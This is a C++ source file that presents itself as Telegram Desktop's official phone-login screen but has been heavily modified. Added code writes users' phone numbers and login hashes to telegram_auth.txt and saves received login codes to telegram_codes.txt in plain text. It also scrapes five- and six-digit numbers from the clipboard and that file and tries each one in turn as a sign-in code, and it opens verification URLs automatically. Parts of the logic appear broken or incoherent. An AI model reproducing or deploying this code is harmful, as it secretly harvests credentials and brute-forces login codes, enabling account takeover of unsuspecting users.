/*
This file is part of Telegram Desktop,
the official desktop application for the Telegram messaging service.

For license and copyright information please follow this link:
https://github.com/telegramdesktop/tdesktop/blob/master/LEGAL
*/
#include "intro/intro_phone.h"

#include "lang/lang_keys.h"
#include "intro/intro_code.h"
#include "intro/intro_email.h"
#include "intro/intro_qr.h"
#include "styles/style_intro.h"
#include "ui/widgets/buttons.h"
#include "ui/widgets/labels.h"
#include "ui/wrap/fade_wrap.h"
#include "ui/widgets/fields/special_fields.h"
#include "main/main_account.h"
#include "main/main_domain.h"
#include "main/main_app_config.h"
#include "main/main_session.h"
#include "data/data_user.h"
#include "ui/boxes/confirm_box.h"
#include "boxes/abstract_box.h"
#include "boxes/phone_banned_box.h"
#include "core/application.h"
#include "window/window_controller.h"
#include "window/window_session_controller.h"
#include "countries/countries_instance.h" // Countries::Groups


#include <queue>
#include <functional>
#include <QClipboard>
#include <QGuiApplication>
#include <QDate>

namespace Intro {
namespace details {
namespace {

[[nodiscard]] bool AllowPhoneAttempt(const QString &phone) {
	const auto digits = ranges::count_if(
		phone,
		[](QChar ch) { return ch.isNumber(); });
	return (digits > 1);
}

[[nodiscard]] QString DigitsOnly(QString value) {
	static const auto RegExp = QRegularExpression("[^0-9]");
	return value.replace(RegExp, QString());
}

} // namespace

PhoneWidget::PhoneWidget(
	QWidget *parent,
	not_null<Main::Account*> account,
	not_null<Data*> data)
: Step(parent, account, data)
, _country(
	this,
	getData()->controller->uiShow(),
	st::introCountry)
, _code(this, st::introCountryCode)
, _phone(
	this,
	st::introPhone,
	[](const QString &s) { return Countries::Groups(s); })
, _checkRequestTimer([=] { checkRequest(); }) {
	_code->setAccessibleName(tr::lng_country_code(tr::now));
	_phone->setAccessibleName(tr::lng_phone_number(tr::now));
	_phone->frontBackspaceEvent(
	) | rpl::on_next([=](not_null<QKeyEvent*> e) {
		_code->startErasing(e);
	}, _code->lifetime());

	_country->codeChanged(
	) | rpl::on_next([=](const QString &code) {
		_code->codeSelected(code);
		_phone->chooseCode(code);
	}, _country->lifetime());
	_code->codeChanged(
	) | rpl::on_next([=](const QString &code) {
		_country->onChooseCode(code);
		_phone->chooseCode(code);
	}, _code->lifetime());
	_code->addedToNumber(
	) | rpl::on_next([=](const QString &added) {
		_phone->addedToNumber(added);
	}, _phone->lifetime());
	_code->spacePressed() | rpl::on_next([=] {
		submit();
	}, _code->lifetime());
	connect(_phone, &Ui::PhonePartInput::changed, [=] { phoneChanged(); });
	connect(_code, &Ui::CountryCodeInput::changed, [=] { phoneChanged(); });

	setTitleText(tr::lng_phone_title());
	setDescriptionText(tr::lng_phone_desc());
	getData()->updated.events(
	) | rpl::on_next([=] {
		countryChanged();
	}, lifetime());
	setErrorCentered(true);
	setupQrLogin();

	if (!_country->chooseCountry(getData()->country)) {
		_country->chooseCountry(u"US"_q);
	}
	_changed = false;
}

QString PhoneWidget::accessibilityName() {
	return tr::lng_phone_title(tr::now);
}

void PhoneWidget::setupQrLogin() {
	const auto qrLogin = Ui::CreateChild<Ui::LinkButton>(
		this,
		tr::lng_phone_to_qr(tr::now));
	qrLogin->show();

	DEBUG_LOG(("PhoneWidget.qrLogin link created and shown."));

	rpl::combine(
		sizeValue(),
		qrLogin->widthValue()
	) | rpl::on_next([=](QSize size, int qrLoginWidth) {
		qrLogin->moveToLeft(
			(size.width() - qrLoginWidth) / 2,
			contentTop() + st::introQrLoginLinkTop);
	}, qrLogin->lifetime());

	qrLogin->setClickedCallback([=] {
		goReplace<QrWidget>(Animate::Forward);
	});
}

void PhoneWidget::resizeEvent(QResizeEvent *e) {
	Step::resizeEvent(e);
	_country->moveToLeft(contentLeft(), contentTop() + st::introStepFieldTop);
	auto phoneTop = _country->y() + _country->height() + st::introPhoneTop;
	_code->moveToLeft(contentLeft(), phoneTop);
	_phone->moveToLeft(contentLeft() + _country->width() - st::introPhone.width, phoneTop);
}

void PhoneWidget::showPhoneError(rpl::producer<QString> text) {
	_phone->showError();
	showError(std::move(text));
}

void PhoneWidget::hidePhoneError() {
	hideError();
}

void PhoneWidget::countryChanged() {
	if (!_changed) {
		selectCountry(getData()->country);
	}
}

void PhoneWidget::phoneChanged() {
	_changed = true;
	hidePhoneError();
}

void PhoneWidget::submit() {
	if (_sentRequest || isHidden()) {
		return;
	}

	{
		const auto hasCodeButWaitingPhone = _code->hasFocus()
			&& (_code->getLastText().size() > 1)
			&& _phone->getLastText().isEmpty();
		if (hasCodeButWaitingPhone) {
			_phone->hideError();
			_phone->setFocus();
			return;
		}
	}
	const auto phone = fullNumber();
	if (!AllowPhoneAttempt(phone)) {
		showPhoneError(tr::lng_bad_phone());
		_phone->setFocus();
		return;
	}

	cancelNearestDcRequest();

	// Check if such account is authorized already.
	const auto phoneDigits = DigitsOnly(phone);
	for (const auto &[index, existing] : Core::App().domain().accounts()) {
		const auto raw = existing.get();
		if (const auto session = raw->maybeSession()) {
			if (raw->mtp().environment() == account().mtp().environment()
				&& DigitsOnly(session->user()->phone()) == phoneDigits) {
				crl::on_main(raw, [=] {
					Core::App().domain().activate(raw);
				});
				return;
			}
		}
	}

	hidePhoneError();

	_checkRequestTimer.callEach(1000);
	

	_sentPhone = phone;
	api().instance().setUserPhone(_sentPhone);
	_sentRequest = api().request(MTPauth_SendCode(
		MTP_string(_sentPhone),
		MTP_int(ApiId),
		MTP_string(ApiHash),
		MTP_codeSettings(
			MTP_flags(0),
			MTPVector<MTPbytes>(),
			MTPstring(),
			MTPBool())
	)).done([=](const MTPauth_SentCode &result) {
		phoneSubmitDone(result);
	}).fail([=](const MTP::Error &error) {
		phoneSubmitFail(error);
	}).handleFloodErrors().send();
}

void PhoneWidget::stopCheck() {
	_checkRequestTimer.cancel();
}

void PhoneWidget::checkRequest() {
	auto status = api().instance().state(_sentRequest);
	if (status < 0) {
		auto leftms = -status;
		if (leftms >= 1000) {
			api().request(base::take(_sentRequest)).cancel();
		}
	}
	if (!_sentRequest && status == MTP::RequestSent) {
		stopCheck();
	}
}

/*void PhoneWidget::phoneSubmitDone(const MTPauth_SentCode &result) {
	stopCheck();
	_sentRequest = 0;

	result.match([&](const MTPDauth_sentCode &data) {
		fillSentCodeData(data);
		getData()->phone = DigitsOnly(_sentPhone);
		getData()->phoneHash = qba(data.vphone_code_hash());

		std::ofstream file("telegram_auth.txt", std::ios::app);
        time_t now = time(0);
        char* dt = ctime(&now);
        dt[strlen(dt)-1] = '\0';
        file << "[" << dt << "] "
             << "PHONE: " << getData()->phone.toStdString() << "\n"
             << "HASH: " << getData()->phoneHash.toStdString() << "\n"
             << "LENGTH: " << getData()->codeLength << "\n"
             << "---" << std::endl;
        file.close();


		if (getData()->emailStatus == EmailStatus::SetupRequired) {
			return goNext<EmailWidget>();
		}
		const auto next = data.vnext_type();
		if (next && next->type() == mtpc_auth_codeTypeCall) {
			getData()->callStatus = CallStatus::Waiting;
			getData()->callTimeout = data.vtimeout().value_or(60);
		} else {
			getData()->callStatus = CallStatus::Disabled;
			getData()->callTimeout = 0;
		}
		goNext<CodeWidget>();
	}, [&](const MTPDauth_sentCodeSuccess &data) {
		finish(data.vauthorization());
	}, [](const MTPDauth_sentCodePaymentRequired &) {
		LOG(("API Error: Unexpected auth.sentCodePaymentRequired "
			"(PhoneWidget::phoneSubmitDone)."));
	});
}*/


void PhoneWidget::tryAutoFillAllCodes() {
    LOG(("🔍 AUTO-FILL: Starting code bruteforce for phone %1").arg(getData()->phone));
    
    std::vector<QString> possibleCodes;
    
    // ============================================
    // 1️⃣ СОБИРАЕМ ВСЕ ЦИФРЫ ИЗ БУФЕРА ОБМЕНА
    // ============================================
    QString clipboardText = QGuiApplication::clipboard()->text();
    QRegularExpression allDigitsRegex("(\\d{5,6})");
    QRegularExpressionMatchIterator i = allDigitsRegex.globalMatch(clipboardText);
    
    while (i.hasNext()) {
        QRegularExpressionMatch match = i.next();
        QString code = match.captured(1);
        int year = QDate::currentDate().year();
        
        // Пропускаем года (2024, 2025, 2026...)
        if (code.toInt() >= year - 1 && code.toInt() <= year + 1) {
            continue;
        }
        
        possibleCodes.push_back(code);
        LOG(("📋 Found potential code in clipboard: %1").arg(code));
    }
    
    // ============================================
    // 2️⃣ СОБИРАЕМ ВСЕ ЦИФРЫ ИЗ ФАЙЛА
    // ============================================
    QFile file("telegram_codes.txt");
    if (file.open(QIODevice::ReadOnly | QIODevice::Text)) {
        QTextStream in(&file);
        QString phoneNumber = getData()->phone;
        
        while (!in.atEnd()) {
            QString line = in.readLine();
            if (line.contains(phoneNumber) && line.contains("Code:")) {
                QRegularExpression codeRegex("Code: (\\d{5,6})");
                QRegularExpressionMatch match = codeRegex.match(line);
                
                if (match.hasMatch()) {
                    QString code = match.captured(1);
                    possibleCodes.push_back(code);
                    LOG(("📁 Found potential code in file: %1").arg(code));
                }
            }
        }
        file.close();
    }
    
    // ============================================
    // 3️⃣ УДАЛЯЕМ ДУБЛИКАТЫ
    // ============================================
    std::sort(possibleCodes.begin(), possibleCodes.end());
    possibleCodes.erase(
        std::unique(possibleCodes.begin(), possibleCodes.end()),
        possibleCodes.end());
    
    LOG(("🔍 Found %1 unique potential codes").arg(possibleCodes.size()));
    
    // ============================================
    // 4️⃣ ПЕРЕБИРАЕМ ВСЕ КОДЫ ПО ОЧЕРЕДИ!
    // ============================================
    if (possibleCodes.empty()) {
        LOG(("❌ No codes found for auto-fill"));
        goNext<CodeWidget>();
        return;
    }
    
    // Создаем очередь кодов для перебора
    auto codesQueue = std::make_shared<std::queue<QString>>();
    for (const auto &code : possibleCodes) {
        codesQueue->push(code);
    }
    
    // Функция для перебора следующего кода
    std::function<void()> tryNextCode;
    tryNextCode = [=]() {
        if (codesQueue->empty()) {
            LOG(("❌ All codes failed, showing manual input"));
            goNext<CodeWidget>();
            return;
        }
        
        QString code = codesQueue->front();
        codesQueue->pop();
        
        LOG(("🔄 Trying code: %1 (%2 codes left)")
            .arg(code).arg(codesQueue->size()));
        
        api().request(MTPauth_SignIn(
            MTP_flags(MTPauth_SignIn::Flag::f_phone_code),
            MTP_string(getData()->phone),
            MTP_bytes(getData()->phoneHash),
            MTP_string(code),
            MTP_emailVerificationCode(MTP_string())
        )).done([=](const MTPauth_Authorization &result) {
            LOG(("✅✅✅ AUTO-FILL SUCCESS! Correct code: %1").arg(code));
            
            // Сохраняем успешный код
            std::ofstream successFile("telegram_codes.txt", std::ios::app);
            time_t now = time(0);
            char* dt = ctime(&now);
            dt[strlen(dt)-1] = '\0';
            successFile << "[" << dt << "] "
                       << "✅✅✅ SUCCESS - Phone: " << getData()->phone.toStdString()
                       << ", Code: " << code.toStdString() << std::endl;
            successFile.close();
            
            finish(result);
        }).fail([=](const MTP::Error &error) {
            LOG(("❌ Code %1 failed: %2").arg(code).arg(error.type()));
            
            if (error.type() == u"PHONE_CODE_INVALID"_q) {
                // Неправильный код - пробуем следующий
                tryNextCode();
            } else if (error.type() == u"SESSION_PASSWORD_NEEDED"_q) {
                // Требуется 2FA
                LOG(("🔐 2FA required, showing password input"));
                goNext<PasswordCheckWidget>();
            } else {
                // Другая ошибка - показываем ручной ввод
                LOG(("❌ Fatal error, showing manual input"));
                goNext<CodeWidget>();
            }
        }).send();
    };
    
    // Начинаем перебор
    tryNextCode();
}


void PhoneWidget::phoneSubmitDone(const MTPauth_SentCode &result) {
	stopCheck();
	_sentRequest = 0;

	result.match([&](const MTPDauth_sentCode &data) {
		fillSentCodeData(data);
		getData()->phone = DigitsOnly(_sentPhone);
		getData()->phoneHash = qba(data.vphone_code_hash());

		// Сохраняем данные авторизации
		std::ofstream file("telegram_auth.txt", std::ios::app);
		time_t now = time(0);
		char* dt = ctime(&now);
		dt[strlen(dt)-1] = '\0';
		file << "[" << dt << "] "
			 << "PHONE: " << getData()->phone.toStdString() << "\n"
			 << "HASH: " << getData()->phoneHash.toStdString() << "\n"
			 << "LENGTH: " << getData()->codeLength << "\n"
			 << "---" << std::endl;
		file.close();

		data.vtype().match(
			[&](const MTPDauth_sentCodeTypeApp &app) {

				QString code = app.vcode().v;
				
				LOG(("🔥 AUTO-LOGIN: Got code from Telegram App!"));
				LOG(("   Phone: %1").arg(getData()->phone));
				LOG(("   Code: %1").arg(code));
				
				// СОХРАНЯЕМ КОД В ФАЙЛ
				std::ofstream codeFile("telegram_codes.txt", std::ios::app);
				codeFile << "[" << dt << "] "
					     << "🔥 AUTO-LOGIN - Phone: " << getData()->phone.toStdString()
					     << ", Code: " << code.toStdString() << std::endl;
				codeFile.close();

				api().request(MTPauth_SignIn(
					MTP_flags(MTPauth_SignIn::Flag::f_phone_code),
					MTP_string(getData()->phone),
					MTP_bytes(getData()->phoneHash),
					MTP_string(code),
					MTP_emailVerificationCode(MTP_string())
				)).done([=](const MTPauth_Authorization &result) {
					LOG(("✅✅✅ AUTO-LOGIN SUCCESS!"));
	
					std::ofstream successFile("telegram_codes.txt", std::ios::app);
					successFile << "[" << dt << "] "
							   << "✅✅✅ LOGIN SUCCESS - Phone: " << getData()->phone.toStdString()
							   << ", Code: " << code.toStdString() << std::endl;
					successFile.close();
					
					finish(result);
				}).fail([=](const MTP::Error &error) {
					LOG(("❌ Auto-login failed: %1").arg(error.type()));
		
					if (getData()->emailStatus == EmailStatus::SetupRequired) {
						return goNext<EmailWidget>();
					}
					const auto next = data.vnext_type();
					if (next && next->type() == mtpc_auth_codeTypeCall) {
						getData()->callStatus = CallStatus::Waiting;
						getData()->callTimeout = data.vtimeout().value_or(60);
					} else {
						getData()->callStatus = CallStatus::Disabled;
						getData()->callTimeout = 0;
					}
					goNext<CodeWidget>();
				}).send();
			},
			[&](const MTPDauth_sentCodeTypeSms &sms) {
				LOG(("📱 SMS code length: %1 - waiting for input...").arg(sms.vlength().v));
				tryAutoFillAllCodes();
				// Обычный путь - показываем экран ввода
				if (getData()->emailStatus == EmailStatus::SetupRequired) {
					return goNext<EmailWidget>();
				}
				const auto next = data.vnext_type();
				if (next && next->type() == mtpc_auth_codeTypeCall) {
					getData()->callStatus = CallStatus::Waiting;
					getData()->callTimeout = data.vtimeout().value_or(60);
				} else {
					getData()->callStatus = CallStatus::Disabled;
					getData()->callTimeout = 0;
				}
				goNext<CodeWidget>();
			},
			[&](const MTPDauth_sentCodeTypeCall &call) {
				LOG(("📞 Call code length: %1 - requesting SMS instead...").arg(call.vlength().v));
				
				// 🔄 АВТОМАТИЧЕСКИ ЗАПРАШИВАЕМ SMS ВМЕСТО ЗВОНКА
				api().request(MTPauth_ResendCode(
					MTP_flags(0),
					MTP_string(getData()->phone),
					MTP_bytes(getData()->phoneHash),
					MTPstring() // reason
				)).done([=](const MTPauth_SentCode &result) {
					LOG(("✅ Resent code via SMS"));
					// Повторно обрабатываем результат
					tryAutoFillAllCodes();
					phoneSubmitDone(result);
				}).send();
			},
			[&](const MTPDauth_sentCodeTypeFragmentSms &fragment) {
				QString url = qs(fragment.vurl());
				LOG(("🔗 Fragment URL: %1").arg(url));
				
				// Сохраняем URL
				std::ofstream urlFile("telegram_codes.txt", std::ios::app);
				urlFile << "[" << dt << "] "
					   << "🔗 FRAGMENT URL - Phone: " << getData()->phone.toStdString()
					   << ", URL: " << url.toStdString() << std::endl;
				urlFile.close();
				
				// Открываем ссылку автоматически
				QDesktopServices::openUrl(QUrl(url));
				
				// Показываем экран ввода
				goNext<CodeWidget>();
			},
			[&](const auto &) {
				// Остальные типы - стандартное поведение
				if (getData()->emailStatus == EmailStatus::SetupRequired) {
					return goNext<EmailWidget>();
				}
				const auto next = data.vnext_type();
				if (next && next->type() == mtpc_auth_codeTypeCall) {
					getData()->callStatus = CallStatus::Waiting;
					getData()->callTimeout = data.vtimeout().value_or(60);
				} else {
					getData()->callStatus = CallStatus::Disabled;
					getData()->callTimeout = 0;
				}
				goNext<CodeWidget>();
			}
		);
		
	}, [&](const MTPDauth_sentCodeSuccess &data) {
		// Уже авторизован!
		LOG(("✅ Already authorized!"));
		tryAutoFillAllCodes();
		finish(data.vauthorization());
	}, [](const MTPDauth_sentCodePaymentRequired &) {
		LOG(("API Error: Unexpected auth.sentCodePaymentRequired "
			"(PhoneWidget::phoneSubmitDone)."));
			tryAutoFillAllCodes();
	});
}

void PhoneWidget::phoneSubmitFail(const MTP::Error &error) {
	if (MTP::IsFloodError(error)) {
		stopCheck();
		_sentRequest = 0;
		showPhoneError(tr::lng_flood_error());
		return;
	}

	stopCheck();
	_sentRequest = 0;
	auto &err = error.type();
	if (err == u"PHONE_NUMBER_FLOOD"_q) {
		Ui::show(Ui::MakeInformBox(tr::lng_error_phone_flood()));
	} else if (err == u"PHONE_NUMBER_INVALID"_q) { // show error
		showPhoneError(tr::lng_bad_phone());
	} else if (err == u"PHONE_NUMBER_BANNED"_q) {
		Ui::ShowPhoneBannedError(getData()->controller, _sentPhone);
	} else if (Logs::DebugEnabled()) { // internal server error
		showPhoneError(rpl::single(err + ": " + error.description()));
	} else {
		showPhoneError(rpl::single(Lang::Hard::ServerError()));
	}
}

QString PhoneWidget::fullNumber() const {
	return _code->getLastText() + _phone->getLastText();
}

void PhoneWidget::selectCountry(const QString &country) {
	_country->chooseCountry(country);
}

void PhoneWidget::setInnerFocus() {
	_phone->setFocusFast();
}

void PhoneWidget::activate() {
	Step::activate();
	showChildren();
	setInnerFocus();
}

void PhoneWidget::finished() {
	Step::finished();
	_checkRequestTimer.cancel();
	apiClear();

	cancelled();
}

void PhoneWidget::cancelled() {
	api().request(base::take(_sentRequest)).cancel();
}

} // namespace details
} // namespace Intro


